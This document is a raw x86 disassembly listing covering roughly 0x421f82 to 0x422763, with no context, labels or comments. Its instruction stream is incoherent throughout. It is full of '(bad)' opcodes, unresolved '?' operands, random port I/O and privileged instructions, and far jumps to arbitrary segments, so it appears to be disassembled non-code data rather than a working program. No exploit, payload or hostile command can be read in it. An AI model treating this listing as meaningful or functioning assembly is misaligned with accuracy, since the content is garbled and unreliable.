  421f82:	enter  0x4c87,0x5d
  421f86:	lods   al,BYTE PTR ds:[esi]
  421f87:	into   
  421f88:	or     eax,0x7b1c3b0d
  421f8d:	call   0xd974:0x2c3f361a
  421f94:	mov    ?,WORD PTR [ebp+0x212840d7]
  421f9a:	mov    BYTE PTR [ebx],dl
  421f9c:	addr16 mov cl,0xbe
  421f9f:	in     eax,dx
  421fa0:	pop    ebp
  421fa1:	or     eax,0xd429f2e3
  421fa6:	es jmp 0x421f94
  421fa9:	out    dx,eax
  421faa:	fimul  DWORD PTR [edi]
  421fac:	sar    cl,cl
  421fae:	cli    
  421faf:	stos   DWORD PTR es:[edi],eax
  421fb0:	dec    esp
  421fb1:	mov    ds:0x70d06690,eax
  421fb6:	jns    0x42202e
  421fb8:	adc    DWORD PTR [esi-0x431f8b4d],ebp
  421fbe:	mov    ch,0xfe
  421fc0:	add    cl,ch
  421fc2:	ins    DWORD PTR es:[di],dx
  421fc4:	clc    
  421fc5:	int    0x2e
  421fc7:	sub    ah,dh
  421fc9:	dec    eax
  421fca:	xchg   ebx,eax
  421fcb:	dec    esp
  421fcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fcd:	mov    dl,0x30
  421fcf:	sub    bh,BYTE PTR [bp+0x49]
  421fd3:	mov    dh,0xff
  421fd5:	mov    edx,0x107d4980
  421fda:	pop    edi
  421fdb:	add    BYTE PTR [esi-0x5e452ec4],0x2e
  421fe2:	ficomp WORD PTR ds:0xf2c66407
  421fe8:	add    ah,BYTE PTR [ebx+esi*8]
  421feb:	add    al,0xc5
  421fed:	iret   
  421fee:	adc    esi,DWORD PTR [edx+0x1c]
  421ff1:	stos   BYTE PTR es:[edi],al
  421ff2:	jno    0x421f9d
  421ff4:	aad    0x47
  421ff6:	pop    es
  421ff7:	mov    cs,esp
  421ff9:	daa    
  421ffa:	sbb    ebp,DWORD PTR [esi]
  421ffc:	mov    cl,0xac
  421ffe:	hlt    
  421fff:	xor    esi,DWORD PTR [ecx]
  422001:	enter  0xbc7e,0xff
  422005:	movzx  esp,WORD PTR [ecx+0x7fca2576]
  42200c:	or     al,0xc4
  42200e:	loope  0x422062
  422010:	aas    
  422011:	and    ebx,esp
  422013:	imul   eax,DWORD PTR [ebx-0x33],0xffffffb7
  422017:	gs (bad) 
  422019:	(bad)  
  42201a:	aas    
  42201b:	ret    
  42201c:	sub    BYTE PTR [edx],ch
  42201e:	out    0x9,eax
  422020:	inc    ebx
  422021:	and    ebp,DWORD PTR [ebx+0x499468ba]
  422027:	cmp    eax,0x9cd73386
  42202c:	pop    esp
  42202d:	jl     0x421ff4
  42202f:	pop    edi
  422030:	adc    ebp,DWORD PTR [ebx]
  422032:	sar    edi,0xe4
  422035:	es mov edi,0x1bc1ef9
  42203b:	or     al,0x5a
  42203d:	inc    ebp
  42203e:	mov    ch,0xdb
  422040:	mov    bl,0x8b
  422042:	push   ds
  422043:	retf   0xe993
  422046:	outs   dx,DWORD PTR ds:[esi]
  422047:	pop    esp
  422048:	push   edx
  422049:	lea    ebp,[edx+0x54]
  42204c:	icebp  
  42204d:	adc    DWORD PTR [ebx-0x58371f40],edx
  422053:	and    edx,DWORD PTR [edi]
  422055:	and    al,0xfb
  422057:	lock mov cs:0xdda5cc05,eax
  42205e:	cld    
  42205f:	pop    ebp
  422060:	fs stos DWORD PTR es:[edi],eax
  422062:	or     ch,BYTE PTR ds:0x320f3485
  422068:	cmp    BYTE PTR [ecx],cl
  42206a:	into   
  42206b:	inc    esp
  42206c:	jp     0x4220b2
  42206e:	mov    esi,0xc4d0b2d0
  422073:	addr16 mov ds:0x67df,al
  422077:	and    BYTE PTR [ecx],dh
  422079:	jge    0x422022
  42207b:	sbb    eax,0xf6c3e8f7
  422080:	jp     0x4220fb
  422082:	call   0x741b:0xbfbea551
  422089:	shr    cl,1
  42208b:	clc    
  42208c:	sbb    bl,BYTE PTR [eax-0x57]
  42208f:	js     0x4220f2
  422091:	or     BYTE PTR [ebp+0x44],0x2c
  422095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422096:	nop    esi
  422099:	sar    DWORD PTR [esi],1
  42209b:	into   
  42209c:	jge    0x4220bf
  42209e:	mov    BYTE PTR [ebx-0x2],ch
  4220a1:	shl    eax,0x7d
  4220a4:	xchg   esi,eax
  4220a5:	adc    eax,0xa2784f3d
  4220aa:	cli    
  4220ab:	int3   
  4220ac:	and    DWORD PTR [ebp-0x71],edx
  4220af:	enter  0x9e41,0xaf
  4220b3:	xchg   esp,eax
  4220b4:	test   eax,0xc0eb1daa
  4220b9:	mov    ebx,0xaa484c87
  4220be:	inc    ebp
  4220bf:	and    ebx,DWORD PTR [ebp-0x7365db1c]
  4220c5:	sar    DWORD PTR [edx+ebp*4],1
  4220c8:	loope  0x422114
  4220ca:	or     al,0xc9
  4220cc:	lea    edi,[ebp+0x67]
  4220cf:	inc    ebp
  4220d0:	sub    esp,ebx
  4220d2:	cmp    BYTE PTR [edi],dh
  4220d4:	aad    0x72
  4220d6:	scas   eax,DWORD PTR es:[edi]
  4220d7:	shr    BYTE PTR [edi],1
  4220d9:	aaa    
  4220da:	(bad)  
  4220db:	push   0xffffff98
  4220dd:	xchg   esp,ecx
  4220df:	xchg   ebx,eax
  4220e0:	cmp    al,0x7
  4220e2:	jge    0x4220ae
  4220e4:	mov    ecx,0xb6e1d147
  4220e9:	cmp    dh,bh
  4220eb:	inc    esi
  4220ec:	xor    cl,BYTE PTR [esi-0x11]
  4220ef:	mov    ds:0xa700a832,eax
  4220f4:	jmp    0xc21a:0x490341af
  4220fb:	inc    edi
  4220fc:	sbb    eax,0x5fc0d1d8
  422101:	pop    edx
  422102:	cmc    
  422103:	popf   
  422104:	iret   
  422105:	daa    
  422106:	cs pop ds
  422108:	jge    0x422126
  42210a:	mov    al,0x9d
  42210c:	in     eax,0xb9
  42210e:	(bad)  
  42210f:	aam    0xc
  422111:	push   esi
  422112:	test   DWORD PTR [ebx-0x6e],edx
  422115:	xchg   ecx,eax
  422116:	nop
  422117:	mov    dl,0xd2
  422119:	sub    bl,dh
  42211b:	xchg   esi,eax
  42211c:	mov    dl,0x4e
  42211e:	cmp    ecx,eax
  422120:	(bad)  
  422121:	xor    BYTE PTR [edx],bh
  422123:	nop
  422124:	mov    DWORD PTR [edx+0x2ddec481],eax
  42212a:	push   esi
  42212b:	sub    bl,ah
  42212d:	js     0x42213d
  42212f:	lds    edx,FWORD PTR [edi]
  422131:	cmp    eax,0xe54b709c
  422136:	pop    esi
  422137:	(bad)  
  422138:	es jnp 0x422101
  42213b:	mov    edi,0xda9dcfef
  422140:	outs   dx,DWORD PTR ds:[esi]
  422141:	lds    ebp,FWORD PTR [esi-0x5f8ee5cd]
  422147:	cmp    dl,BYTE PTR [eax+0x78]
  42214a:	imul   eax,DWORD PTR [ecx+0x7ecf5f00],0xffffff8d
  422151:	in     al,0x8d
  422153:	or     esp,ecx
  422155:	and    DWORD PTR [ecx],0xffffffc3
  422158:	pop    ebx
  422159:	bound  ecx,QWORD PTR [ebx-0x3242d0b1]
  42215f:	and    ebx,DWORD PTR ds:0x959859
  422165:	fdivr  QWORD PTR [edx-0x31]
  422168:	xor    dl,BYTE PTR [ebp-0xb]
  42216b:	sub    ecx,DWORD PTR [ebx-0x6c]
  42216e:	mov    edx,DWORD PTR [ecx+0xcb5b990]
  422174:	(bad)  ds:0x68486245
  42217a:	mov    al,0x78
  42217c:	loope  0x4221c5
  42217e:	lahf   
  42217f:	and    ebp,ebp
  422181:	data16 (bad) 
  422183:	rol    DWORD PTR [edx-0x3777d626],cl
  422189:	and    DWORD PTR [esi+0x4d299c71],ebp
  42218f:	call   0xc6cbf88e
  422194:	in     eax,0x27
  422196:	jno    0x422173
  422198:	adc    ch,ah
  42219a:	ja     0x4221f6
  42219c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42219d:	pop    ds
  42219e:	lods   eax,DWORD PTR ds:[esi]
  42219f:	push   edi
  4221a0:	push   esi
  4221a1:	sub    BYTE PTR [esi],0x1b
  4221a4:	and    eax,esp
  4221a6:	mov    esi,db0
  4221a9:	push   esi
  4221aa:	cdq    
  4221ab:	mov    cs:0xf489cbca,eax
  4221b1:	push   ecx
  4221b2:	mov    ?,WORD PTR [eax]
  4221b4:	dec    ebx
  4221b5:	mov    esi,?
  4221b7:	sar    dh,cl
  4221b9:	mov    al,ds:0x47266558
  4221be:	pop    edi
  4221bf:	ror    BYTE PTR [esi+0x79281707],cl
  4221c5:	xchg   ebx,eax
  4221c6:	pop    ebp
  4221c7:	xchg   ebp,eax
  4221c8:	pop    es
  4221c9:	sbb    DWORD PTR [eax],esi
  4221cb:	arpl   WORD PTR ds:0xd182a615,dx
  4221d1:	lods   al,BYTE PTR ds:[esi]
  4221d2:	mov    cl,0x9d
  4221d4:	jp     0x4221b0
  4221d6:	jo     0x42222c
  4221d8:	dec    esi
  4221da:	xchg   esp,eax
  4221db:	ins    DWORD PTR es:[edi],dx
  4221dc:	retf   
  4221dd:	add    eax,0x5e27dd7a
  4221e2:	in     eax,0x73
  4221e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221e5:	push   ebx
  4221e6:	enter  0x6a3b,0x18
  4221ea:	outs   dx,BYTE PTR ds:[esi]
  4221eb:	nop
  4221ec:	or     eax,0x1ad01d21
  4221f1:	adc    edx,DWORD PTR [esi+esi*1]
  4221f4:	fucomi st,st(5)
  4221f6:	xor    eax,0x5c5895ec
  4221fb:	imul   edi,DWORD PTR [eax+0x5af9f249],0x63
  422202:	aaa    
  422203:	outs   dx,BYTE PTR ds:[esi]
  422204:	inc    esp
  422205:	push   es
  422206:	bound  eax,QWORD PTR [edi]
  422208:	(bad)  
  422209:	adc    al,0xe5
  42220b:	sbb    ebp,esi
  42220d:	data16 int3 
  42220f:	add    dh,BYTE PTR [ebp+0x8]
  422212:	das    
  422213:	cs or  al,0x7e
  422216:	retf   0xf206
  422219:	int    0x5b
  42221b:	ins    BYTE PTR es:[edi],dx
  42221c:	ret    
  42221d:	test   BYTE PTR [ebx-0x21a3f382],ch
  422223:	hlt    
  422224:	es inc ebp
  422226:	jl     0x422223
  422228:	test   BYTE PTR [ebx-0x153d949],ch
  42222e:	add    eax,DWORD PTR [edi+edx*8-0x66bfc48b]
  422235:	iret   
  422236:	iret   
  422237:	mov    cl,0x74
  422239:	jmp    0x8a01bae3
  42223e:	inc    DWORD PTR cs:[bx+si]
  422242:	clc    
  422243:	xor    eax,DWORD PTR [edi-0x37]
  422246:	add    cl,BYTE PTR [edi]
  422248:	in     eax,0xe
  42224a:	aad    0xce
  42224c:	cmp    DWORD PTR [ecx],eax
  42224e:	call   0xb9b1:0x2e0f200a
  422255:	mov    ebx,DWORD PTR [edx]
  422257:	aaa    
  422258:	test   DWORD PTR [edi+0x679ccefa],edi
  42225e:	aam    0x2a
  422260:	mov    ebp,0xec057da
  422265:	mov    cl,0xd4
  422267:	mov    dh,0xfa
  422269:	xor    al,0x8c
  42226b:	std    
  42226c:	repz sub ah,cl
  42226f:	mov    al,0x6c
  422271:	add    eax,0x14faa2d0
  422276:	int    0xe5
  422278:	sbb    dl,BYTE PTR [ebp+0x19]
  42227b:	inc    eax
  42227c:	repz pop ecx
  42227e:	fyl2x  
  422280:	dec    BYTE PTR [ebp-0x6fdc3b2b]
  422286:	mov    dh,0x77
  422288:	push   esp
  422289:	mov    ch,0x3
  42228b:	adc    BYTE PTR es:[edi-0x4326574a],0x18
  422293:	mov    edi,0x3319fb13
  422298:	xor    eax,0xcdd800ee
  42229d:	leave  
  42229e:	lods   eax,DWORD PTR ds:[esi]
  42229f:	mov    ebx,DWORD PTR [eax+0x242b9bb3]
  4222a5:	adc    al,0x53
  4222a7:	xchg   BYTE PTR [eax],al
  4222a9:	add    BYTE PTR [edx+0x44],al
  4222ac:	inc    ebx
  4222ad:	push   edi
  4222ae:	inc    edi
  4222af:	push   edi
  4222b0:	push   esi
  4222b1:	push   ebp
  4222b2:	outs   dx,DWORD PTR ds:[esi]
  4222b3:	pop    ebp
  4222b4:	mov    ds:0xdfa133dc,eax
  4222b9:	cdq    
  4222ba:	xor    BYTE PTR [ecx+0x6860001],0x0
  4222c1:	add    BYTE PTR [edx-0x24],bl
  4222c4:	mov    ebp,0x719b8f1
  4222c9:	faddp  st(3),st
  4222cb:	add    DWORD PTR [ecx+esi*1],edi
  4222ce:	inc    esi
  4222cf:	xchg   esi,eax
  4222d0:	inc    esp
  4222d1:	ins    DWORD PTR es:[edi],dx
  4222d2:	iret   
  4222d3:	lahf   
  4222d4:	pop    ebx
  4222d5:	pop    edx
  4222d6:	dec    eax
  4222d7:	pop    edi
  4222d8:	dec    ebx
  4222d9:	bnd jo 0x422334
  4222dc:	inc    edi
  4222dd:	adc    ebp,DWORD PTR [edx]
  4222df:	in     eax,0x1a
  4222e1:	mov    dl,0x63
  4222e3:	push   es
  4222e4:	div    DWORD PTR [ecx]
  4222e6:	cmp    ch,0xa1
  4222e9:	loop   0x4222a7
  4222eb:	enter  0x5154,0x2b
  4222ef:	cmp    bl,al
  4222f1:	pop    ds
  4222f2:	xor    dh,dh
  4222f4:	stc    
  4222f5:	push   0xffffff8b
  4222f7:	add    eax,0x22506eb5
  4222fc:	sub    DWORD PTR [edi+0x75],edi
  4222ff:	jno    0x422288
  422301:	push   ds
  422302:	push   ss
  422303:	test   eax,0x201e63bf
  422308:	inc    esp
  422309:	xchg   BYTE PTR [eax],al
  42230b:	inc    ecx
  42230c:	sub    eax,0xa73aca1c
  422311:	ja     0x422321
  422313:	and    BYTE PTR [ebp-0x1b0c4f2f],bl
  422319:	sbb    bh,cl
  42231b:	push   esi
  42231c:	pop    edi
  42231d:	mov    ebp,0xea147270
  422322:	xlat   BYTE PTR ds:[ebx]
  422323:	pop    eax
  422324:	xchg   edx,eax
  422325:	and    ah,BYTE PTR [eax]
  422327:	add    DWORD PTR [esi+edx*8+0x39],esp
  42232b:	and    al,0x6f
  42232d:	outs   dx,DWORD PTR ds:[esi]
  42232e:	mov    DWORD PTR [ecx-0x3cea204f],edx
  422334:	mov    edi,0x19b1626
  422339:	fld    DWORD PTR [eax+edx*2]
  42233c:	ror    DWORD PTR [ecx+0x6342a3a3],cl
  422342:	mov    cl,0x8b
  422344:	inc    edi
  422345:	clc    
  422346:	cmp    esi,DWORD PTR [ebp-0x26fa3f5c]
  42234c:	mov    ah,BYTE PTR [eax+edi*4]
  42234f:	jnp    0x422312
  422351:	mov    ebx,0x61916fe0
  422356:	push   DWORD PTR ds:0x25cf3638
  42235c:	inc    ebp
  42235d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42235e:	idiv   BYTE PTR [edx-0x10]
  422361:	aam    0xeb
  422363:	out    0x33,al
  422365:	pusha  
  422366:	add    eax,0x823a7c7b
  42236b:	xor    dh,BYTE PTR [eax+esi*4]
  42236e:	out    dx,eax
  42236f:	nop
  422370:	popf   
  422371:	lds    edx,FWORD PTR [ecx+ebp*1-0x49ce4f91]
  422378:	leave  
  422379:	clc    
  42237a:	(bad)  
  42237c:	xor    DWORD PTR [edi-0x5f45be66],esp
  422382:	test   BYTE PTR [esi],dl
  422384:	jge    0x4223f6
  422386:	je     0x4223f6
  422388:	(bad)  
  422389:	and    DWORD PTR [edx-0x36],ebp
  42238c:	xchg   ebp,eax
  42238d:	out    dx,al
  42238e:	lods   eax,DWORD PTR ds:[esi]
  42238f:	mov    bl,0x14
  422391:	mul    BYTE PTR es:[ebx-0x68e9056d]
  422398:	jb     0x4223f2
  42239a:	cld    
  42239b:	pop    esp
  42239c:	retf   
  42239d:	add    eax,0x38acf016
  4223a2:	xor    BYTE PTR fs:[eax+0x44],0xe1
  4223a7:	and    BYTE PTR [edi],bh
  4223a9:	frstor [ecx+0xf]
  4223ac:	repnz out dx,al
  4223ae:	fs repnz scas al,BYTE PTR es:[edi]
  4223b1:	outs   dx,DWORD PTR ds:[esi]
  4223b2:	rol    DWORD PTR [edi-0x3e],cl
  4223b5:	cmp    eax,0x36e9fe2c
  4223ba:	cwde   
  4223bb:	pushf  
  4223bc:	clc    
  4223bd:	pop    ss
  4223be:	int3   
  4223bf:	pop    edi
  4223c0:	add    bh,al
  4223c2:	test   eax,0xf2aeeb37
  4223c7:	out    0xcd,al
  4223c9:	repnz xchg esp,eax
  4223cb:	repnz in al,0x11
  4223ce:	inc    eax
  4223cf:	inc    BYTE PTR [eax*8-0xc7fe418]
  4223d6:	ins    DWORD PTR es:[edi],dx
  4223d7:	sub    esp,ecx
  4223d9:	mov    esi,0xe613ba32
  4223de:	pop    ecx
  4223df:	jmp    0x4223a6
  4223e1:	(bad)  
  4223e2:	stos   DWORD PTR es:[edi],eax
  4223e3:	mov    DWORD PTR ds:0xf5abac6,edx
  4223e9:	mov    esp,0x4e74ab37
  4223ee:	jg     0x4223d7
  4223f0:	pop    eax
  4223f1:	leave  
  4223f2:	cmp    al,0x6f
  4223f4:	lea    eax,[ebx+ebp*8-0x58f8c39b]
  4223fb:	loop   0x4223bb
  4223fd:	mov    ds:0xc7860bfc,al
  422402:	push   ebp
  422403:	mov    dh,0x52
  422405:	sub    al,0x83
  422407:	stc    
  422408:	add    ebp,ebp
  42240a:	mov    edi,0xfa52b575
  42240f:	loopne 0x4223b0
  422411:	xchg   esp,eax
  422412:	xor    eax,0x63bd4c9b
  422417:	nop
  422418:	call   0x9c098e31
  42241d:	popa   
  42241e:	add    eax,esi
  422420:	in     al,0x30
  422422:	or     eax,0xf55cea19
  422427:	add    esp,esi
  422429:	sbb    BYTE PTR [ebp+0x47],cl
  42242c:	add    BYTE PTR [edi],bl
  42242e:	js     0x422449
  422430:	(bad)  
  422431:	call   FWORD PTR [ecx+0x1d]
  422434:	xlat   BYTE PTR ds:[ebx]
  422435:	jecxz  0x4223df
  422437:	enter  0x9d48,0xe2
  42243b:	adc    DWORD PTR [eax-0x4220d8b1],edi
  422441:	(bad)  
  422442:	(bad)  
  422444:	pusha  
  422445:	retf   
  422446:	mov    dl,0x5
  422448:	in     al,0xbc
  42244a:	cmp    edi,esp
  42244c:	fcmovbe st,st(7)
  42244e:	pop    esi
  42244f:	and    al,0x6f
  422451:	pop    es
  422452:	test   BYTE PTR [eax-0x25],ah
  422455:	outs   dx,BYTE PTR ds:[esi]
  422456:	sbb    eax,0x42184af7
  42245b:	test   DWORD PTR [eax-0x59],esp
  42245e:	pop    esp
  42245f:	aas    
  422460:	and    BYTE PTR [edx+eiz*4],dl
  422463:	imul   ebx,DWORD PTR [eax],0x3af51fe3
  422469:	lds    ebp,FWORD PTR [edi+0x19509000]
  42246f:	test   al,0xc
  422471:	repz jbe 0x422450
  422474:	scas   eax,DWORD PTR es:[edi]
  422475:	mov    esp,0xf04b101d
  42247a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42247b:	dec    edx
  42247c:	sti    
  42247d:	jle    0x4224d0
  42247f:	push   ebp
  422480:	mov    esi,0x741f3d4e
  422485:	mov    ds:0xbfab654,eax
  42248a:	jmp    0x84db:0x47b7
  422490:	or     al,BYTE PTR [ecx]
  422492:	loope  0x4224f2
  422494:	pushf  
  422495:	xchg   edx,eax
  422496:	lock cld 
  422498:	cld    
  422499:	inc    edx
  42249a:	lds    esi,FWORD PTR [ecx]
  42249c:	add    BYTE PTR [esi-0x5fd301f3],ch
  4224a2:	dec    ebp
  4224a3:	daa    
  4224a4:	outs   dx,DWORD PTR ds:[esi]
  4224a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224a6:	xor    DWORD PTR [eax-0x70],0xbd9b2af5
  4224ad:	rcr    ebp,1
  4224af:	mov    dl,0xd8
  4224b1:	cmp    dl,0x6c
  4224b4:	aam    0x1
  4224b6:	xor    bh,dl
  4224b8:	jl     0x422535
  4224ba:	dec    edi
  4224bb:	push   esi
  4224bc:	fistp  DWORD PTR [ebx+0x50]
  4224bf:	(bad)  
  4224c0:	enter  0xd7db,0x2a
  4224c4:	jmp    0xa5726c9d
  4224c9:	mov    dl,0x23
  4224cb:	and    eax,0xd8593b9a
  4224d0:	in     al,0x1
  4224d2:	aas    
  4224d3:	test   eax,0xd71de5a9
  4224d8:	hlt    
  4224d9:	jbe    0x42246d
  4224db:	jb     0x4224c0
  4224dd:	mov    ds:0xa6972125,al
  4224e2:	call   0xc3eb:0xedf0d7aa
  4224e9:	ror    BYTE PTR [edi+0x6],0x99
  4224ed:	sar    DWORD PTR [edx+0x0],0xb3
  4224f1:	push   esp
  4224f2:	mov    DWORD PTR [eax],ebx
  4224f4:	aam    0x70
  4224f6:	inc    esi
  4224f7:	mov    ah,0x21
  4224f9:	mov    ?,WORD PTR ds:0x93cce94b
  4224ff:	leave  
  422500:	stos   DWORD PTR es:[edi],eax
  422501:	dec    ebx
  422502:	push   edx
  422503:	repz dec BYTE PTR [eax]
  422506:	fnstsw WORD PTR [ecx+esi*2-0x19]
  42250a:	add    BYTE PTR [ecx+0x2a],dh
  42250d:	inc    esi
  42250e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42250f:	adc    eax,0x318c4b15
  422514:	sub    cl,BYTE PTR fs:[ebx]
  422517:	sbb    eax,ecx
  422519:	push   es
  42251a:	xor    ecx,ecx
  42251c:	outs   dx,BYTE PTR ds:[esi]
  42251d:	sti    
  42251e:	add    ebp,DWORD PTR [esi+0x7e05a83a]
  422524:	mov    al,0x6b
  422526:	test   al,0x95
  422528:	adc    al,BYTE PTR [edi-0x7c]
  42252b:	and    eax,0xa7968edb
  422530:	into   
  422531:	jmp    0x1042:0x9651d391
  422538:	inc    edi
  422539:	mov    al,ds:0x55ba85ed
  42253e:	push   eax
  42253f:	in     al,dx
  422540:	shr    BYTE PTR [edx],1
  422542:	int    0x99
  422544:	stos   BYTE PTR es:[edi],al
  422545:	sti    
  422546:	mov    ch,0x59
  422548:	sub    DWORD PTR [ecx-0x41addaf9],esi
  42254e:	and    ebp,ebp
  422550:	xor    BYTE PTR [esi],dl
  422552:	and    edi,DWORD PTR [esi]
  422554:	jae    0x42254c
  422556:	push   edi
  422557:	fstp   QWORD PTR [esi]
  422559:	and    esp,DWORD PTR [eax+edx*1]
  42255c:	rcl    bl,1
  42255e:	adc    ebx,DWORD PTR [edx]
  422560:	(bad)  
  422561:	push   cs
  422562:	ja     0x422522
  422564:	push   ss
  422565:	jae    0x4225c0
  422567:	jmp    0xec07:0x7fb395d0
  42256e:	call   DWORD PTR [edx+0x3f6ad009]
  422574:	xor    DWORD PTR [esi-0x3308556c],ecx
  42257a:	mov    DWORD PTR es:0x7cbd6222,edx
  422581:	mov    BYTE PTR [ebx],ah
  422583:	push   esp
  422584:	mov    eax,ds:0xc60e1717
  422589:	addr16 jno 0x422578
  42258c:	xchg   edi,eax
  42258d:	jecxz  0x42257f
  42258f:	mov    bh,0x80
  422591:	jno    0x4225a8
  422593:	pop    es
  422594:	jge    0x42253d
  422596:	push   ecx
  422597:	imul   edx,DWORD PTR [ebp-0x408a7fd4],0x20
  42259e:	cwde   
  42259f:	aas    
  4225a0:	cmp    DWORD PTR [eax],ecx
  4225a2:	jecxz  0x4225c7
  4225a4:	shl    BYTE PTR [ecx+0x5bab08df],cl
  4225aa:	call   0x5a442dd6
  4225af:	push   ss
  4225b0:	fimul  WORD PTR [edx+0x6dd2638]
  4225b6:	(bad)  
  4225b8:	mov    bh,0xe7
  4225ba:	outs   dx,DWORD PTR ds:[esi]
  4225bb:	mov    esi,0x6b3970b3
  4225c0:	xchg   BYTE PTR [edi+0x1c0fc121],cl
  4225c6:	inc    edx
  4225c7:	sub    al,0xd4
  4225c9:	or     al,0xc5
  4225cb:	dec    edi
  4225cc:	jle    0x422635
  4225ce:	xchg   ebp,eax
  4225cf:	(bad)  
  4225d0:	adc    al,0xd3
  4225d2:	es sub al,0x7e
  4225d5:	mov    dl,0xb2
  4225d7:	retf   0xa13
  4225da:	mov    fs,WORD PTR [eax]
  4225dc:	loopne 0x422616
  4225de:	cdq    
  4225df:	add    eax,0xfef7aafc
  4225e4:	sub    eax,0x39aa031e
  4225e9:	jg     0x422667
  4225eb:	jne    0x422625
  4225ed:	adc    esp,DWORD PTR [edx]
  4225ef:	adc    BYTE PTR [esi+eax*4-0x26037ca],dh
  4225f6:	mov    WORD PTR [ecx-0x38],?
  4225f9:	lock pop ds
  4225fb:	in     al,0x51
  4225fd:	push   eax
  4225fe:	cwde   
  4225ff:	lds    esi,FWORD PTR [ebp-0x5]
  422602:	adc    DWORD PTR [esi+edi*2+0x73],edi
  422606:	xor    DWORD PTR [ebx+0x6d],0xffffffb7
  42260a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42260b:	scas   eax,DWORD PTR es:[edi]
  42260c:	add    esp,DWORD PTR [ebx+0x18]
  42260f:	inc    edi
  422610:	mov    ebp,0xed2e35e6
  422615:	out    0xa4,eax
  422617:	popf   
  422618:	test   BYTE PTR [esi-0x1ca45f6],ah
  42261e:	cmp    esp,DWORD PTR [ecx]
  422620:	push   es
  422621:	stc    
  422622:	test   al,0x80
  422624:	adc    DWORD PTR [eax+0xa],0xafe97819
  42262b:	fucom  st(3)
  42262d:	sub    eax,0xb050a87a
  422632:	jp     0x4226a2
  422634:	fiadd  WORD PTR [edx+ecx*4]
  422637:	retf   0x312b
  42263a:	movhps QWORD PTR [ebx-0x34],xmm5
  42263e:	mov    ebp,esp
  422640:	jns    0x422607
  422642:	cmp    esi,DWORD PTR [esi-0x4f1fb975]
  422648:	push   cs
  422649:	adc    esp,ecx
  42264b:	ss daa 
  42264d:	pop    ecx
  42264e:	in     al,dx
  42264f:	fmul   QWORD PTR [ebp+eax*4+0x68]
  422653:	adc    eax,0xc859a318
  422659:	sti    
  42265a:	push   es
  42265b:	mov    esi,ebx
  42265d:	gs mov bh,0x19
  422660:	sbb    ch,BYTE PTR [eax]
  422662:	int3   
  422663:	sbb    esi,ebp
  422665:	jo     0x422683
  422667:	pop    esi
  422668:	mov    bh,0x1
  42266a:	pop    edi
  42266b:	xor    al,0x5e
  42266d:	stos   DWORD PTR es:[edi],eax
  42266e:	sub    al,0xd0
  422670:	aad    0xa
  422672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422673:	outs   dx,BYTE PTR ds:[esi]
  422674:	and    BYTE PTR ds:0xa6c16890,0xf8
  42267b:	mov    ds:0xf0c99e5a,al
  422680:	icebp  
  422681:	sub    BYTE PTR [eax-0x2442bab4],bh
  422687:	(bad)  
  422688:	push   DWORD PTR [esi-0x4d]
  42268b:	js     0x422658
  42268d:	sub    al,0xd0
  42268f:	sub    BYTE PTR [esi+0x78],al
  422692:	push   0xffffff90
  422694:	or     eax,esp
  422696:	or     eax,DWORD PTR [edx]
  422698:	loope  0x422695
  42269a:	in     al,dx
  42269b:	int    0x47
  42269d:	cmp    dl,BYTE PTR [ebx]
  42269f:	push   es
  4226a0:	sub    DWORD PTR [ecx+esi*1+0x5777fc22],ebp
  4226a7:	mov    edi,0x52ccaf41
  4226ac:	mov    BYTE PTR [edi+0xb8dad45],ah
  4226b2:	mov    dh,al
  4226b4:	sub    edx,esi
  4226b6:	cmp    BYTE PTR [ebp-0x46],bl
  4226b9:	loope  0x4226f1
  4226bb:	ds add edi,0xffaed629
  4226c2:	push   edi
  4226c3:	jne    0x42264d
  4226c5:	gs pop esi
  4226c7:	outs   dx,BYTE PTR ds:[esi]
  4226c8:	push   0x2baa1327
  4226cd:	pop    ebp
  4226ce:	loope  0x4226e7
  4226d0:	sbb    eax,0xb574f697
  4226d5:	mov    es,WORD PTR [ecx+0x1160ab71]
  4226db:	popa   
  4226dc:	mov    cl,0x53
  4226de:	and    al,0xf
  4226e0:	lahf   
  4226e1:	xchg   esi,eax
  4226e2:	dec    ebp
  4226e3:	add    DWORD PTR [ebx-0x3f],0x17bcd688
  4226ea:	inc    esi
  4226eb:	dec    ebp
  4226ec:	dec    esi
  4226ed:	shr    BYTE PTR [eax],0x39
  4226f0:	fst    DWORD PTR [eax+esi*2+0x4d]
  4226f4:	loop   0x422754
  4226f6:	inc    ecx
  4226f7:	mov    ah,0x83
  4226f9:	push   0x1e9f465b
  4226fe:	pop    ebp
  4226ff:	into   
  422700:	(bad)  
  422701:	sbb    BYTE PTR [ebp+0x2b3fac5c],dh
  422707:	ds jnp 0x4226a8
  42270a:	add    BYTE PTR [ebx],dl
  42270c:	cmc    
  42270d:	jmp    0x4226b2
  42270f:	adc    ebp,edi
  422711:	jmp    0x5f0b:0x84a34efe
  422718:	aas    
  422719:	or     DWORD PTR [ebx-0xf],esp
  42271c:	ret    0x2ba2
  42271f:	pop    edx
  422720:	mov    ds:0x8875ac26,eax
  422725:	fdiv   DWORD PTR [ecx+0x6]
  422728:	enter  0x6ea,0x89
  42272c:	bound  ebp,QWORD PTR [edx+0x42]
  42272f:	xor    DWORD PTR [edx+0x1],0xffffffbb
  422733:	pop    esi
  422734:	pop    ebp
  422735:	ret    0xae0f
  422738:	xchg   ebx,eax
  422739:	or     ebx,DWORD PTR [edi+0x57]
  42273c:	or     al,0xa
  42273e:	dec    edx
  42273f:	div    BYTE PTR [edx+0x49]
  422742:	mov    BYTE PTR [edi-0x5],0xa5
  422746:	adc    eax,ecx
  422748:	shr    esp,0x62
  42274b:	jp     0x4227b5
  42274d:	dec    edi
  42274e:	pop    esp
  42274f:	add    ecx,DWORD PTR [eax-0x39f4c112]
  422755:	cdq    
  422756:	sub    bl,ah
  422758:	scas   eax,DWORD PTR es:[edi]
  422759:	inc    edi
  42275a:	out    dx,eax
  42275b:	pop    ecx
  42275c:	cmp    ah,dh
  42275e:	jns    0x422718
  422760:	jb     0x4227ac
  422762:	aas    
  422763:	in     al,dx
